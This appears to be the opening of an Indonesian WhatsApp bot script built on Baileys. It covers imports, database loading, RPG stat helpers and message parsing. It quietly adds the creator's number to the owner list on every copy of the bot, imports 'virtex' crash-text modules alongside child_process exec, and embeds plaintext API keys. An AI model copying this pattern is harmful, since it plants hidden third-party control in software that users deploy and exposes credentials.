/*

GK KASI CREDIT YT SIEGRIN, GK USAH RE UPLOAD
SUSAH" NGE FIX, LU CUMA NUMPANG NAMA DOANG
YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
JASA RUN HEROKU BISA PC wa.me/6289530298948 BIAR BOT NYA GAK TERLALU DELAY
	
*/
//===============================================================================//
const {
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
WA_DEFAULT_EPHEMERAL,
ChatModification,
WAMessageProto,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
relayWAMessage,
mentionedJid,
processTime,
Browsers } = require("@adiwajshing/baileys")
const simple = require('./lib/bot/simple.js')
const { spawn, exec, execSync } = require("child_process")
const translate = require('@vitalets/google-translate-api')
const WAConnection = simple.WAConnection(_WAConnection)
const toHur = require('@develoka/angka-terbilang-js')
const twitterGetUrl = require("twitter-url-direct")
const imageToBase64 = require('image-to-base64')
const ID3Writer = require('browser-id3-writer');	
const brainly = require('brainly-scraper')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const { EmojiAPI } = require("emoji-api")
const Fb = require('fb-video-downloader');
const speed = require('performance-now')
const imgbb = require('imgbb-uploader')	
const ffmpeg = require('fluent-ffmpeg')
const FormData = require('form-data')
const googleImage = require('g-i-s')
const fetch = require('node-fetch');
const ig = require('insta-fetcher')
const vapor = require('vapor-text')
const cheerio = require('cheerio')
const request = require('request');
const qrcodes = require('qrcode');
const yts = require( 'yt-search')
const Math_js = require('mathjs')
const ggs = require('google-it')
const fsx = require("fs-extra")
const axios = require("axios")
const ms = require('parse-ms')
const hx = require('hxz-api')
const gis = require('g-i-s')
const emoji = new EmojiAPI()
const got = require("got");
const toMs = require('ms')
const fs = require("fs")

//===============================================================================//
const { jadibot, stopjadibot } = require('./jadibot.js')
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/bot/functions')
const { addCommands, checkCommands, deleteCommands } = require('./lib/bot/commandsrespon.js')
const { setTtt, getWins, getWin, getLose, generateBoard } = require('./lib/bot/tictactoe.js')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/bot/fetcher')
const { sleep, isAfk, cekafk, addafk } = require('./lib/bot/offline')
const {yta ,ytv, igdl, upload } = require('./lib/bot/ytdl')
const { herodetails } = require('./lib/bot/herodetail.js')
const { antivirtexx } = require('./lib/bot/antivirtex.js')
const { mediafireDl } = require('./lib/bot/mediafire.js')
const { virtex, vipi } = require('./lib/bot/virtex.js')
const { addVote, delVote } = require('./lib/bot/vote')
const { webp2mp4File} = require('./lib/bot/webp2mp4')
const { herolist } = require('./lib/bot/herolist.js')
const { color, bgcolor } = require('./lib/bot/color')
const { pinterest } = require('./lib/bot/pinterest')
const { cmdadd } = require('./lib/bot/totalcmd.js')
const { lirikLagu } = require('./lib/bot/lirik.js')
const { wikiSearch } = require('./lib/bot/wiki.js')
const { msgFilter } = require('./lib/bot/antispam')
const { recognize } = require('./lib/bot/ocr')
const zalgo = require('./lib/bot/zalgo')

//===============================================================================//

const setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./strg/video.json'))
const audionye = JSON.parse(fs.readFileSync('./strg/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))

//===============================================================================//

const dungeonpoint = JSON.parse(fs.readFileSync('./database/bot/dungeonpoint.json'))
const sfilter = JSON.parse(fs.readFileSync('./database/bot/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./database/bot/gcdetect.json'))
let filter = JSON.parse(fs.readFileSync('./database/bot/filter.json'))

//===============================================================================//

let tebakcaklontong = JSON.parse(fs.readFileSync('./database/group/tebakcaklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/group/tebaksiapaaku.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/group/tebakgambar.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/group/antivirtex.json'))
const eventtime = JSON.parse(fs.readFileSync('./database/group/eventtime.json'))
const ntilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'))
const badword = JSON.parse(fs.readFileSync('./database/group/badword.json'))
const welkom = JSON.parse(fs.readFileSync('./database/group/welkom.json'))
const mute = JSON.parse(fs.readFileSync('./database/group/mute.json'))
const bad = JSON.parse(fs.readFileSync('./database/group/bad.json'))
let family100 = [];

//===============================================================================//

const prem = JSON.parse(fs.readFileSync('./database/user/premium.json'))

//===============================================================================//

const _registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const commandsrespon = JSON.parse(fs.readFileSync('./database/bot/commands.json'))
const scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))
const _win = JSON.parse(fs.readFileSync('./database/bot/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./database/bot/tttlose.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/bot/tictactoe.json"))
const afk = JSON.parse(fs.readFileSync('./database/bot/off.json'))
const voting = JSON.parse(fs.readFileSync('./database/bot/voting.json'))

//===============================================================================//

const settingbot = JSON.parse(fs.readFileSync('./src/settingsbot.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const { ind } = require('./language')

//===============================================================================//	
registc = fs.readFileSync('./lib/sticker/kamu sudah terdaftar.webp')
adminstc = fs.readFileSync('./lib/sticker/kamu bukan admin!.webp')
errorstc = fs.readFileSync('./lib/sticker/error.webp')
grupstc = fs.readFileSync('./lib/sticker/pakai itu digrup!.webp')
botadmstc = fs.readFileSync('./lib/sticker/jadiin aku admin.webp')
loadingstc = fs.readFileSync('./lib/sticker/loading.webp')
banstc = fs.readFileSync('./lib/sticker/kamu di ban.webp')
ownerstc = fs.readFileSync('./lib/sticker/kamu bukan ownerku!.webp')
daftarstc = fs.readFileSync('./lib/sticker/daftar dulu!.webp')
waitstc = fs.readFileSync('./lib/sticker/tunggu sebentar.webp')
kickstc = fs.readFileSync('./lib/sticker/kamu akan ku kick.webp')
welcomestc = fs.readFileSync('./lib/sticker/welcome.webp')
leavestc = fs.readFileSync('./lib/sticker/leave.webp')
needownstc = fs.readFileSync('./lib/sticker/kamu butuh ownerku.webp')
premiumstc = fs.readFileSync('./lib/sticker/kamu butuh akses premium!.webp')
successtc = fs.readFileSync('./lib/sticker/berhasil.webp')
faktifstc = fs.readFileSync('./lib/sticker/Fitur Sudah aktif.webp')
fnaktifstc = fs.readFileSync('./lib/sticker/Fitur belum aktif.webp')
spamstc = fs.readFileSync('./lib/sticker/Jangan spam.webp')
tfstc = fs.readFileSync('./lib/sticker/Transaksi sukses.webp')
trolistc = fs.readFileSync('./lib/sticker/Ada Bug Troli nih.webp')
judistc = fs.readFileSync('./lib/sticker/Mari berjudi.webp')
siegrinstc = fs.readFileSync('./lib/sticker/Subcribe siegrin.webp')
makanstc = fs.readFileSync('./lib/sticker/Kamu lapar makan dulu.webp')
heealstc = fs.readFileSync('./lib/sticker/Healmu kurang.webp')

//===============================================================================//

cecan = "cecan" 
cogan = "cogan" 
genshin = "genshin" 
meme = "meme" 
lol = "lol" 
ml = "ml"
fantasy = "dungeon"
deflttheme = "logo" 
themenye = `${cecan}` 
const WMthumb = fs.readFileSync(`src/siegrin.jpeg`)

//===============================================================================//

linkcom = ".com" 
linkid = ".id" 
linkxyz = ".xyz" 
linkly = ".ly" 
linkhttp = "http" 
linkwa = "://chat.whatsapp.com"
deflt = "//chat.whatsapp.com" 
linknye = `${deflt}` 

//===============================================================================//

owner = setting.owner
owner2 = setting.owner2
owner3 = setting.owner3
developer = setting.developer
dev = `6289530298948@s.whatsapp.net` // jangan diganti
ow = `${owner}@s.whatsapp.net`// jangan diganti
ownername = setting.ownername
ownername2 = setting.ownername2
ownername3 = setting.ownername3
numbernye = "0"

//===============================================================================//

github = setting.github 
mygmail = setting.mygmail 
myyoutube = setting.myyoutube
mytiktok = setting.mytiktok
mytwitter = setting.mytwitter
mybio = setting.mybio

//===============================================================================//

fakereply = setting.fakereply
supportme = setting.supportme
prefix = setting.prefix 
namo = setting.namo
ator = setting.ator
fake = setting.fake
pref = '#' 

//===============================================================================//

donasi = setting.donasi
rekening = setting.rekening
trakteer = setting.trakteer
saweria = setting.saweria

//===============================================================================//

bugc = settingbot.bugc 
antitrol = settingbot.antitrol  
antical = settingbot.antical 
antitags = settingbot.antitags 
readG = settingbot.readG
readP = settingbot.readP  
multi = settingbot.multi  
mainmenu = settingbot.mainmenu 
autoregis = true
banChats = settingbot.banChats  
autorespon = settingbot.autorespon 
autobackup = settingbot.autobackup 
autorecording = settingbot.autorecording 
autocomposing = settingbot.autocomposing 

//===============================================================================//

hit_today = []
blocked = []
offline = false
waktu = '-'
alasan = '-'
//===============================================================================//

const own = [`${owner}@s.whatsapp.net`, `${owner2}@s.whatsapp.net`, `${owner3}@s.whatsapp.net`, '6289530298948@s.whatsapp.net']
const vcard = `BEGIN:VCARD\nVERSION:3.0\nN:${fake}\nFN:Siegrin\nitem1.TEL;waid=6289530298948:6289530298948\nitem1.X-ABLabel:Creator Bot \nitem2.EMAIL;type=INTERNET:${mygmail}\nitem2.X-ABLabel:Email\nitem4.URL:${mybio}\nitem4.X-ABLabel:Youtube\nitem5.ADR:;;🇮🇩 Indonesia;;;;\nitem5.X-ABLabel:Region\nitem6.X-ABLabel:Thank Siegrin\nEND:VCARD`

const vcardowner = `BEGIN:VCARD\nVERSION:3.0\nN:${fake}\nFN:${ownername}\nitem1.TEL;waid=${owner}:${owner}\nitem1.X-ABLabel:Creator Bot \nitem2.EMAIL;type=INTERNET:${mygmail}\nitem2.X-ABLabel:Email\nitem4.URL:${mybio}\nitem4.X-ABLabel:Youtube\nitem5.ADR:;;🇮🇩 Indonesia;;;;\nitem5.X-ABLabel:Region\nitem6.X-ABLabel:Thank Siegrin\nEND:VCARD`
 
//===============================================================================//

const zeksApi = ["apivinz","1b0xJAqegS9UW2CgjcErnkAqIQT","AwIRGm29MIDTaieafAwBs5zRcpX","FPOQ12gopfq1ktpGP6ppsu3H3Sx"]

//===============================================================================// 



battery = {
  persen: "" || "tidak terdeteksi",
  charger: "" || false
};


const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
}

const addRegisteredUser = (sender) => {
            const obj = { id: sender, limit : 100, uang : 0, xp: 1, ATK: 0, ARM: 0, PWR: 0, SKL: 0, DEF: 0, SPD: 0, MGC: 0, LUK: 0, level: 1, kerangajaib : 0, jamur : 0, daunmaple : 0, daun : 0, daun1 : 0, daun2 : 0, clover3 : 0, clover4 : 0, kayu : 0, bibit : 0, puzzle : 0, heal : 0, potion : 0, megapotion : 0, berlian : 0, emas : 0, perak : 0, perunggu : 0, iron : 0, brick : 0, stone : 0, kurakura : 0, gurita : 0, cumicumi : 0, udang : 0, lobster : 0, kepiting : 0, pufferfish : 0, ikan : 0, ikan2 : 0, lumbalumba : 0, paus : 0, paus2 : 0, hiu : 0, seadog : 0, pohoncactus : 0, pohonnatal : 0, pohoncemara : 0,pohon : 0, bambu : 0, padi : 0, pohonkelapa : 0 }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
}


const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}

const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].xp += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].level += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
const addLimitUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].limit += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkLimituser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].limit
            }
        }
		
		 const confirmLIMIT = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].limit -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].uang += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].uang
            }
        }
		
		const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].uang -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }

//=================================================//
		
		const addHealUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].heal += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const checkHealuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].heal
            }
        }
		
		const confirmHEAL = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].heal -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
//=================================================//

        const addPotionUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].potion += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const checkPotionuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].potion
            }
        }
         
         const confirmPOTION = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].potion -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
//=================================================//

        const addMegaPotionUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].megapotion += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const checkMegaPotionuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].megapotion
            }
        }
         
         const confirmMEGAPOTION = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].megapotion -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }		
	 
	 const addATKUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].ATK += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkATKuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].ATK
            }
        }
		
		 const confirmATK = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].ATK -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addARMUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].ARM += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkARMuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].ARM
            }
        }
		
		 const confirmARM = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].ARM -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addPWRUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].PWR += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkPWRuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].PWR
            }
        }
		
		 const confirmPWR = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].PWR -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addSKLUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].SKL += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkSKLuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].SKL
            }
        }
		
		 const confirmSKL = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].SKL -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addDEFUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].DEF += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkDEFuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].DEF
            }
        }
		
		 const confirmDEF = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].DEF -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addSPDUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].SPD += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkSPDuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].SPD
            }
        }
		
		 const confirmSPD = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].SPD -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addMGCUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].MGC += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkMGCuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].MGC
            }
        }
		
		 const confirmMGC = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].MGC -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }
		
		const addLUKUser = (sender, amount) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].LUK += amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }	
		
      const checkLUKuser = (sender) => {
        	let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _registered[position].LUK
            }
        }
		
		 const confirmLUK = (sender, amount) => {
             let position = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _registered[position].LUK -= amount
                fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
            }
        }

//=================================================//
module.exports = client = async (client, mek) => {
try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
global.blocked
const content = JSON.stringify(mek.message)
const m = simple.smsg(client, mek)
const antibot = m.isBaileys
const from = mek.key.remoteJid
const { quotedMek, isQuotedMek, mentioned} = mek
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product, buttonsMessage } = MessageType
const type = Object.keys(mek.message)[0]
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
// var prefix = ''
var prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+,;]/gi) : '!'  	
} else {
prefix = pref
}
const body = (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const arg = chats.slice(command.length + 2, chats.length)
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const isbuttonCmd = body.selectedButtonId
const islistCmd = body.selectedRowIdId
if (isCmd) cmdadd()
const isStMsg = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
const totalhit = JSON.parse(fs.readFileSync('./database/bot/totalcmd.json'))[0].totalcmd
hit_today.push(isCmd)
const q = args.join(' ')
const botNumber = client.user.jid
const sender = mek.key.fromMe ? client.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined

//=================================================//
const isRegistered = checkRegisteredUser(sender)
const isGroup = from.endsWith('@g.us')
const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const groupName = isGroup ? groupMetadata.subject : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupId = isGroup ? groupMetadata.jid : ''
const totalchat = await client.chats.all()
const totalgroup = await client.chats.array.filter(v => v.jid.endsWith('g.us'))
const totalkontak = await client.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))

//=================================================//

const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const wib = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
if(wib < "23:59:00"){
var hahh = '🌃 Selamat Malam'
}
if(wib < "19:00:00"){
var hahh = '🌇 Selamat Petang'
}
if(wib < "18:00:00"){
var hahh = '🌁️ Selamat Sore'
}
if(wib < "15:00:00"){
var hahh = '🌅 Selamat Siang'
}
if(wib < "11:00:00"){
var hahh = '🌄 Selamat Pagi'
}
if(wib < "05:00:00"){
var hahh = '🌃 Selamat Malam'
}

//=================================================//

isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
isStc = `${isStc}`
const isStcQ = isStc !== "" && content.includes("extendedTextMessage") 
isStc !== "" && content.includes("conversation") 
const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
const isStcVideo = isStcMedia && content.includes("videoMessage")
const isStcImage = isStcMedia && content.includes("imageMessage")
const isStcSticker = isStcMedia && content.includes("stickerMessage")
const isStcTeks = isStcMedia && content.includes("quotedMessage")
const isStcDocs = isStcMedia && content.includes("documentMessage")
const isStcContact = isStcMedia && content.includes("contactMessage")
const isStcAudio = isStcMedia && content.includes("audioMessage")
const isStcLoca = isStcMedia && content.includes("locationMessage")
const isStcTag = isStcMedia && content.includes("mentionedJid")
const isStcReply = isStcMedia && content.includes("Message")
const isStcProd = isStcMedia && content.includes("productMessage")

//=================================================//

const isOwner = own.includes(sender) || mek.key.fromMe
const isBanned = blocked.includes(sender)
const isPremium = prem.includes(sender) || isOwner

//=================================================//

const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
const isEvento = isGroup ? eventtime.includes(from) : false
const isBadWord = isGroup ? badword.includes(from) : false
const AntiLink = isGroup ? ntilink.includes(from) : false
const isWelkom = isGroup ? welkom.includes(from) : false
const isVote = isGroup ? voting.includes(from) : false
